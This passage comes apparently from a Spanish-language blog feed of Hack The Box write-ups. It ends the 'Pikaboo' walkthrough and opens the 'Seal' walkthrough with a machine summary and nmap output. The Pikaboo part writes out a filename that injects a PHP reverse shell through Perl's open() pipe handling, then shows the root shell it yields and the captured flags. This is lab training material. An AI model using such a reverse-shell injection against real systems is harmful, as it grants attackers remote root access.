&lt;/div&gt;&lt;p&gt;Tras analizar las librerias no encontramos algun tipo de vulnerabilidad pero algunas funciones de Perl se mencionan ser vulnerables (&lt;a href=&#34;https://www.cgisecurity.com/lib/sips.html&#34;&gt;1&lt;/a&gt;, &lt;a href=&#34;https://perldoc.perl.org/perlsec&#34;&gt;2&lt;/a&gt;, &lt;a href=&#34;https://stackoverflow.com/questions/26614348/perl-open-injection-prevention&#34;&gt;3&lt;/a&gt;, &lt;a href=&#34;https://www.shlomifish.org/lecture/Perl/Newbies/lecture4/processes/opens.html&#34;&gt;4&lt;/a&gt;) especificamente &lt;code&gt;open()&lt;/code&gt; en este caso. Segun la informacion un archivo que comienza con &lt;code&gt;|&lt;/code&gt; es interpretado como un comando.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If the filename begins with &amp;ldquo;|&amp;rdquo;, the filename is interpreted as a command to which output is to be piped, and if the filename ends with a &amp;ldquo;|&amp;rdquo;, the filename is interpreted as a command which pipes output to us.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;En tal caso podriamos ejecutar comandos creando un archivo con una shell inversa, ademÃ¡s debemos de agregar &lt;code&gt;csv&lt;/code&gt; ya que el cronjob toma todos los archivos con estos caracteres. Utilizamos Thunar para crear el archivo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;php -r &lt;span class=&#34;s1&#34;&gt;&amp;#39;$sock=fsockopen(&amp;#34;10.10.14.24&amp;#34;,1338);exec(&amp;#34;sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;csv
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Por alguna razon el archivo no se muestra en Thunar y por FTP tras subir dicho archivo.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pikaboo/Screenshot_20210722_190211.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Aunque al pasar algunos segundos obtuvimos una shell como root y la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; Ï€ ~/htb/pikaboo â¯ bash -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;rlwrap nc -lvp 1338&amp;#39;&lt;/span&gt;
listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt; ...
connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.24&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from 10.10.10.249 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.10.249&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;44940&lt;/span&gt;
can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t access tty; job control turned off
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;python -c &amp;#39;&lt;/span&gt;import pty&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;pty.spawn&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
root@pikaboo:/srv/ftp/abilities# whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; id&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
root
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/srv/ftp/abilities
root@pikaboo:/srv/ftp/abilities# &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt;
root@pikaboo:~# ls
root.txt  vsftpd.log
root@pikaboo:~# cat root.txt
cat root.txt
31ea660be5feed8e26eea494874fb2fa
root@pikaboo:~# cat /home/pwn*/user.txt
b6b20e171c3d5d3425f7bfaafea34501
root@pikaboo:~#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/pikaboo/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/pikaboo/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>lfi</category>
            
          
            
              <category>lfi log poisoning</category>
            
          
            
              <category>nginx</category>
            
          
            
              <category>ldap</category>
            
          
            
              <category>perl</category>
            
          
            
              <category>nginx misc</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Seal</title>
        <link>https://sckull.github.io/posts/seal/</link>
        <pubDate>Sat, 13 Nov 2021 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 13 Nov 2021 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/seal/</guid>
        <description>Seal presenta distintos respositorios en GitBucket, donde se muestra la configuracion de Nginx y Tomcat, por medio de estos logramos acceder al primer usuario.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/seal/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Seal presenta distintos respositorios en GitBucket, donde se muestra la configuracion de Nginx y Tomcat, por medio de estos logramos acceder al primer usuario. Un proceso nos permitiÃ³ generar un backup de la clave privada con un enlace simbolico de SSH de un segundo usuario. Finalmente escalamos privilegios utilizando ansible-playbook.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/358&#34;&gt;Seal&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.250&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/13531&#34;&gt;MrR3boot&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/13531&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[6.3, 5.9, 4.9, 5.1, 4.1],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[6, 10, 5, 5, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;nmap&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos con nmap nos muestra multiples puertos abiertos: ssh (22), https (443), http (8080). AdemÃ¡s se muestra un dominio: &lt;code&gt;seal.htb&lt;/code&gt; el cual agregamos al archivo &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Tue Jul 13 17:58:34 2021 as: nmap -sV -sC -p22,443,8080 -oN scans 10.10.10.250&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.250 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.250&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.068s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;3072&lt;/span&gt; 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
443/tcp  open  ssl/http   nginx 1.18.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: nginx/1.18.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Seal Market
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;seal.htb/organizationName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Seal Pvt Ltd/stateOrProvinceName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;London/countryName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;UK
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2021-05-05T10:24:03
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2022-05-05T10:24:03
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-alpn:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-nextprotoneg:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
8080/tcp open  http-proxy
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   FourOhFourRequest:
